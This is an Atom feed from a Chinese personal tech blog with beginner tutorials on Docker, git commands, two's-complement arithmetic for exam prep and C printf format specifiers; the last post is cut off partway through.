<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>凌晨九点空间</title>
  
  <subtitle>Dawn at Nine</subtitle>
  <link href="https://lcjd99.github.io/atom.xml" rel="self"/>
  
  <link href="https://lcjd99.github.io/"/>
  <updated>2024-04-27T15:45:07.262Z</updated>
  <id>https://lcjd99.github.io/</id>
  
  <author>
    <name>凌晨九点</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker 入门教程（一）：基本用法</title>
    <link href="https://lcjd99.github.io/utils/docker/docker-1/"/>
    <id>https://lcjd99.github.io/utils/docker/docker-1/</id>
    <published>2024-04-26T14:50:47.000Z</published>
    <updated>2024-04-27T15:45:07.262Z</updated>
    
    <content type="html"><![CDATA[<p>Docker允许用户将基础设施中的应用单独分割出来，形成更小的颗粒，从而提高交付软件的速度。 Docker容器与虚拟机类似，但二者在原理上不同。容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、更能高效地利用服务器。</p><p>本文基于docker的官方文档，对使用过程中的一些基本使用规则做一个记录。 并且将以一个简单的 C 程序为例，构建一个可运行镜像</p><h2 id="一-基本模型"><a class="markdownIt-Anchor" href="#一-基本模型"></a> 一、基本模型</h2><p>和其他教程一样，作为基本用法的篇章，我不会对其具体原理有过多的阐述。</p><p>下图是从docker官网找到的架构图<img src="https://docs.docker.com/get-started/images/docker-architecture.webp" alt="" /></p><p>作为入门用户，需要理解的概念是 <strong>镜像</strong> 和 <strong>容器</strong> 。</p><ul><li>镜像为正在运行的容器提供使用隔离的文件系统。这个独立的文件系统由映像提供，并且映像必须包含运行应用程序所需的所有内容——所有依赖项、配置、脚本、二进制文件等。映像还包含容器的其他配置，例如环境变量、要运行的默认命令和其他元数据。</li><li>容器是在主机上运行的沙盒进程，它与在该主机上运行的所有其他进程隔离。</li></ul><p>其实可以将其大致理解为类和对象的关系，镜像相当于为当前的环境构建的一个类，而生成的容器相当于为类构建的对象。只不过这个类实际上是对系统环境的虚拟化。</p><h2 id="二-通过-dockerfile-构建镜像"><a class="markdownIt-Anchor" href="#二-通过-dockerfile-构建镜像"></a> 二、通过 Dockerfile 构建镜像</h2><p>首先有一个简单的项目结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello_docker/</span><br><span class="line">├── main.c</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><p>其中<code>main.c</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello Docker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Makefile</code>如下:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">CFLAGS=-Wall</span><br><span class="line"></span><br><span class="line"><span class="section">all: main</span></span><br><span class="line"></span><br><span class="line"><span class="section">main: main.o</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -o main main.o</span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c main.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f main main.o</span><br></pre></td></tr></table></figure><p>这是添加一个文件为<code>Dockerfile</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . . </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y gcc</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;make&amp;&amp;./main&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>代表我们构建镜像的方式，是以ubuntu20.04 作为基础，将目录复制到镜像的文件中，同时在其中更新软件包下载gcc编译器，并执行程序。</p><p>这是在当前目录下输入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t hello-docker .</span><br></pre></td></tr></table></figure><p>docker服务会按照Dockerfile的描述执行构建镜像，其中 <code>-t</code> 代表为镜像打tag。</p><p>然后根据镜像构建容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-docker</span><br></pre></td></tr></table></figure><p>我们将看到程序在docker中执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Docker允许用户将基础设施中的应用单独分割出来，形成更小的颗粒，从而提高交付软件的速度。 Docker容器与虚拟机类似，但二者在原理上不同。容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、更能高效地利用服务器。&lt;/p&gt;
&lt;p&gt;本文基于docker的</summary>
      
    
    
    
    <category term="docker" scheme="https://lcjd99.github.io/categories/docker/"/>
    
    
    <category term="utils" scheme="https://lcjd99.github.io/tags/utils/"/>
    
  </entry>
  
  <entry>
    <title>git 入门教程（一）：基本用法</title>
    <link href="https://lcjd99.github.io/utils/git/git-1/"/>
    <id>https://lcjd99.github.io/utils/git/git-1/</id>
    <published>2024-04-15T14:50:47.000Z</published>
    <updated>2024-04-27T14:47:30.598Z</updated>
    
    <content type="html"><![CDATA[<p>Git是一个免费的开源分布式版本控制系统，旨在以快速和高效的方式处理项目的所有内容。</p><p>本博客是对 <a href="https://git-scm.com/">pro git</a> 的学习笔记 ，并配合一些自己使用的理解。</p><h2 id="一-基本模型"><a class="markdownIt-Anchor" href="#一-基本模型"></a> 一 、基本模型</h2><p>在这一篇文章不会对git的模型进行深入的介绍(后续会具体探讨)，读者只需要知道当前目录暂存区(stage)、本地提交区(暂时这样表示)就可以了。</p><p><img src="https://git-scm.com/book/en/v2/images/areas.png" alt="" /></p><p>git在创建仓库后对版本控制的操作都需要通过添加暂存区后再提交。假如当前目录中有大量文件被修改，而为保证结构清晰，需要分别成多次快照的保存，就可以分别添加到暂存区再提交。</p><h2 id="二-基本命令"><a class="markdownIt-Anchor" href="#二-基本命令"></a> 二、 基本命令</h2><p>以下命令直接以<code>git [command] -h</code>的格式就可以看到参数使用规则</p><h3 id="21-基本的基本"><a class="markdownIt-Anchor" href="#21-基本的基本"></a> 2.1 基本的基本</h3><h4 id="创建仓库"><a class="markdownIt-Anchor" href="#创建仓库"></a> 创建仓库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>该命令创建一个新的<code>git</code>仓库，其原理会在下一篇文章中说明。</p><h4 id="添加暂存区"><a class="markdownIt-Anchor" href="#添加暂存区"></a> 添加暂存区</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;files&gt;</span><br></pre></td></tr></table></figure><p>通过此命令可以将指定文件或者目录添加到暂存区。</p><p><strong>tldr</strong></p><ul><li>使用<code>git add .</code> 快速添加当前目录下全部修改文件到暂存区</li></ul><h4 id="提交暂存区内容"><a class="markdownIt-Anchor" href="#提交暂存区内容"></a> 提交暂存区内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit </span><br></pre></td></tr></table></figure><p>这里需要说明的是每次commit的都需要有相应的信息，表示本次提交对代码的修改，git会自动打开默认的编辑器在你填写完提交信息后关闭即可。</p><p><strong>tldr</strong></p><ul><li>使用<code>git commit -m &quot;text&quot;</code> 可以直接添加简单的提交信息而不打开编辑器</li><li>使用<code>git commit -a </code> 提交所有修改的文件</li></ul><h3 id="22-查看提交历史"><a class="markdownIt-Anchor" href="#22-查看提交历史"></a> 2.2 查看提交历史</h3><p>可以查看仓库的完整提交历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p><strong>tldr</strong></p><ul><li>使用<code>git log -p -2</code> 查看最近两次提交的修改</li><li>使用<code>git log --stat</code> 统计每次的变更信息</li><li>使用<code>git log --pretty=oneline</code> 查看一行信息</li></ul><h3 id="23-查看当前仓库状态"><a class="markdownIt-Anchor" href="#23-查看当前仓库状态"></a> 2.3 查看当前仓库状态</h3><p>这里借用 <a href="https://git-scm.com/">pro git</a> 中对仓库状态转移的图描述其过程</p><p><img src="https://git-scm.com/book/en/v2/images/lifecycle.png" alt="" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p><strong>tldr</strong></p><ul><li>使用<code>git status -s</code> 可以查看简短的文件状态信息</li><li>使用*.gitignore*文件可以配置不被git追踪的文件(支持正则表达式)</li></ul><h3 id="24-回滚文件"><a class="markdownIt-Anchor" href="#24-回滚文件"></a> 2.4 回滚文件</h3><h4 id="重做提交"><a class="markdownIt-Anchor" href="#重做提交"></a> 重做提交</h4><p>如果你认为上一次提交并不完整，你可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit --amend</span><br></pre></td></tr></table></figure><p>该命令将暂存区和上次提交的信息一起提交，并进入修改信息的编辑器界面</p><h4 id="重做暂存区"><a class="markdownIt-Anchor" href="#重做暂存区"></a> 重做暂存区</h4><p>如果将将暂存区中的某个文件移出暂存区可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="文件状态回滚"><a class="markdownIt-Anchor" href="#文件状态回滚"></a> 文件状态回滚</h4><p><strong>这是有风险的操作，被回滚的操作无法撤回</strong></p><p>如果你不希望文件的修改，并希望上次提交状态可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git restore &lt;file&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure><h3 id="25-分支管理"><a class="markdownIt-Anchor" href="#25-分支管理"></a> 2.5 分支管理</h3><h4 id="创建分支"><a class="markdownIt-Anchor" href="#创建分支"></a> 创建分支</h4><p>每次提交都像链表一样被记录，而分支就像是从链表中分岔出的一条路，最后能合并回这个主路上。这样使用的理由也很简单，就像是支线任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch &lt;branchName&gt;</span><br></pre></td></tr></table></figure><p><strong>tldr</strong></p><ul><li>使用<code>git branch -a</code>查看所有分支</li><li>使用<code>git branch -d &lt;branchName&gt;</code>删除指定分支</li></ul><h4 id="切换分支"><a class="markdownIt-Anchor" href="#切换分支"></a> 切换分支</h4><p>创建分支后实际上还在原来的分支中，需要切换到指定的分支中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;branchName&gt;</span><br></pre></td></tr></table></figure><p><strong>tldr</strong></p><ul><li>使用<code>git checkout -b &lt;branchName&gt;</code>可以直接新建并切换到新的分支</li></ul><h4 id="合并分支"><a class="markdownIt-Anchor" href="#合并分支"></a> 合并分支</h4><p>当需要将一个分支和另一个分支合并时就会用到合并分支的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branchName&gt;</span><br></pre></td></tr></table></figure><p>表示将该分支合并到当前分支中</p><p>这其中可能会产生冲突，</p><h3 id="25-远程仓库管理"><a class="markdownIt-Anchor" href="#25-远程仓库管理"></a> 2.5 远程仓库管理</h3><h4 id="克隆仓库"><a class="markdownIt-Anchor" href="#克隆仓库"></a> 克隆仓库</h4><p>当需要使用远程仓库的时候需要克隆仓库，这里的远程仓库地址未必是一个url也可以是在同一文件系统下的另一个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;repo&gt; [your_repo_name]</span><br></pre></td></tr></table></figure><p>通过以上能够克隆一个完整仓库到指定目录下，需要注意在克隆时路径下不能有相同文件名的目录。</p><p>如果仓库是克隆的，那该仓库会有一个默认<code>origin</code>的远程仓库地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote </span><br></pre></td></tr></table></figure><p>上述命令可以查看本仓库的远程仓库</p><p><strong>tldr</strong></p><ul><li>使用<code>git remote show &lt;name&gt;</code> 查看远程仓库的完整信息</li><li>使用<code>git remote get-url &lt;name&gt; </code> 可以查看指定远程仓库的url</li><li>使用<code>git remote set-url &lt;name&gt; &lt;url&gt;</code> 可以为添加指定远程仓库的url</li></ul><h4 id="远程拉取"><a class="markdownIt-Anchor" href="#远程拉取"></a> 远程拉取</h4><p>当远程仓库更新后，我们也要积极更新本地仓库以保证和远程同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch &lt;remote&gt;</span><br></pre></td></tr></table></figure><p>该操作并不会将远程仓库更新的代码自动合并到当前分支中，而是将远程仓库中的分支作为一个本地分支存储，需要手动将远程分支合并到当前分支中（具体操作同<strong>合并分支</strong>）</p><p>也可以使用 <code>git pull</code> 能够将上述操作同时执行，拉取并合并。</p><h4 id="远程推送"><a class="markdownIt-Anchor" href="#远程推送"></a> 远程推送</h4><p>当需要将本地提交的代码推送到远程仓库中时需要使用以下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push &lt;remote&gt; &lt;branch&gt;</span><br></pre></td></tr></table></figure><p>该指令将本地的指定分支推送到远程仓库中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Git是一个免费的开源分布式版本控制系统，旨在以快速和高效的方式处理项目的所有内容。&lt;/p&gt;
&lt;p&gt;本博客是对 &lt;a href=&quot;https://git-scm.com/&quot;&gt;pro git&lt;/a&gt; 的学习笔记 ，并配合一些自己使用的理解。&lt;/p&gt;
&lt;h2 id=&quot;一-基本模</summary>
      
    
    
    
    <category term="git" scheme="https://lcjd99.github.io/categories/git/"/>
    
    
    <category term="utils" scheme="https://lcjd99.github.io/tags/utils/"/>
    
  </entry>
  
  <entry>
    <title>【考研】计组 （二）： 数据的表示和运算</title>
    <link href="https://lcjd99.github.io/Postgraduate/CS/Organization/Lecture2/"/>
    <id>https://lcjd99.github.io/Postgraduate/CS/Organization/Lecture2/</id>
    <published>2024-04-12T14:51:47.000Z</published>
    <updated>2024-04-14T15:22:23.011Z</updated>
    
    <content type="html"><![CDATA[<p>经过做题的实践发现，对于原码、补码、移码等运算除了掌握计算机基本的运算规则以外还有一些共性的规律，利用这些规律可以更快速的解题，将我总结的规律记录如下。</p><h2 id="一-定点数编码解题技巧"><a class="markdownIt-Anchor" href="#一-定点数编码解题技巧"></a> 一、定点数编码解题技巧</h2><h3 id="10-一些常识"><a class="markdownIt-Anchor" href="#10-一些常识"></a> 1.0 一些常识</h3><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>=</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">2^8 = 256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord">6</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>16</mn></msup><mo>=</mo><mn>65536</mn></mrow><annotation encoding="application/x-tex">2^{16} = 65536</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">5</span><span class="mord">3</span><span class="mord">6</span></span></span></span></li><li>8位数最大表示为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>7</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^7 - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，计算机中始终从0位开始数</li><li>相同位数的补码和移码表示的数据范围相同</li></ul><h3 id="11-补码的规律"><a class="markdownIt-Anchor" href="#11-补码的规律"></a> 1.1 补码的规律</h3><blockquote><p>一个8位的数用补码表示其表示范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mn>7</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{-7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span>  到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>7</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{7} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></blockquote><p>思考方式：补码不对称，0将正数的一个位置占了，因此正数少一个， 同时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span> 位最多表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">2^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span> 个数，应此得到这个结果</p><blockquote><p>一个8位的负数通过补码计算真值的时候如果这个数除符号位的部分容易确定大小，可以直接用公式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">-(2^8 - m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 得到结果，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span> 是这个正数。</p></blockquote><p>思考方式： 这个实际上是补码的定义，有时候比化成反码再算要快</p><blockquote><p>补码的数值变化规律： 实际上是两个递增的一次函数，其中断点在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 处， 在单调区间内可以直接比较大小</p></blockquote><p>思考方式： 别想了，容易倒腾乱</p><blockquote><p>有符号数和无符号数的转化关系，具体例子如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> a = <span class="number">-32767</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, b); </span><br></pre></td></tr></table></figure><p>对于这个问题求解为 $b = 2^{16} - |a| $</p></blockquote><p>思考方法： $ a = 2^{15} - |m|$ ， 同时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><msup><mn>2</mn><mn>15</mn></msup><mo>+</mo><mi mathvariant="normal">∣</mi><mi>m</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">b = 2^{15} + |m|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mord">∣</span></span></span></span> , 其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span> 就是除最高位的表示数</p><h3 id="12-移码的规律"><a class="markdownIt-Anchor" href="#12-移码的规律"></a> 1.2 移码的规律</h3><blockquote><p>偏移为127的移码</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;经过做题的实践发现，对于原码、补码、移码等运算除了掌握计算机基本的运算规则以外还有一些共性的规律，利用这些规律可以更快速的解题，将我总结的规律记录如下。&lt;/p&gt;
&lt;h2 id=&quot;一-定点数编码解题技巧&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;</summary>
      
    
    
    
    <category term="考研" scheme="https://lcjd99.github.io/categories/%E8%80%83%E7%A0%94/"/>
    
    
    <category term="Computer Organization" scheme="https://lcjd99.github.io/tags/Computer-Organization/"/>
    
  </entry>
  
  <entry>
    <title>C语言格式化输出问题</title>
    <link href="https://lcjd99.github.io/others/c-format-output/"/>
    <id>https://lcjd99.github.io/others/c-format-output/</id>
    <published>2024-04-04T14:51:47.000Z</published>
    <updated>2024-04-10T09:12:21.579Z</updated>
    
    <content type="html"><![CDATA[<p>在日常使用中C语言时，对于命令行工具输出格式化控制非常重要，虽然每天都在用<code>printf</code>但是对其具体的使用还是很容易忘记，于是做如下总结</p><p>在 C 语言中，格式化打印主要通过 <code>printf</code>、<code>sprintf</code>、<code>snprintf</code>、<code>fprintf</code> 等函数实现，它们都使用格式字符串来指定输出数据的类型和格式。格式字符串由普通字符和格式指定符组成，格式指定符用来指定随后参数的打印方式。</p><h3 id="常用的格式指定符"><a class="markdownIt-Anchor" href="#常用的格式指定符"></a> 常用的格式指定符：</h3><ul><li><code>%d</code>：输出有符号十进制整数。</li><li><code>%u</code>：输出无符号十进制整数。</li><li><code>%x</code> 或 <code>%X</code>：输出十六进制整数，<code>%x</code> 输出小写字母，<code>%X</code> 输出大写字母。</li><li><code>%o</code>：输出八进制整数。</li><li><code>%f</code>：输出浮点数。</li><li><code>%e</code> 或 <code>%E</code>：输出指数形式的浮点数，<code>%e</code> 使用小写 <code>e</code>，<code>%E</code> 使用大写 <code>E</code>。</li><li><code>%g</code> 或 <code>%G</code>：输出浮点数，自动选择 <code>%f</code> 或 <code>%e</code>/%<code>E</code> 的格式，取决于数值的大小。</li><li><code>%c</code>：输出单个字符。</li><li><code>%s</code>：输出字符串。</li><li><code>%p</code>：输出指针的值（十六进制表示）。</li><li><code>%%</code>：输出一个百分号 <code>%</code>。</li></ul><p>除了上述基本的格式指定符，还可以在 <code>%</code> 和格式字符之间插入一些标志、宽度、精度等修饰符：</p><h3 id="标志方式"><a class="markdownIt-Anchor" href="#标志方式"></a> 标志方式</h3><ul><li><code>标志</code>：<ul><li><code>-</code>：左对齐输出。</li><li><code>+</code>：输出数值的正负号。</li><li><code> 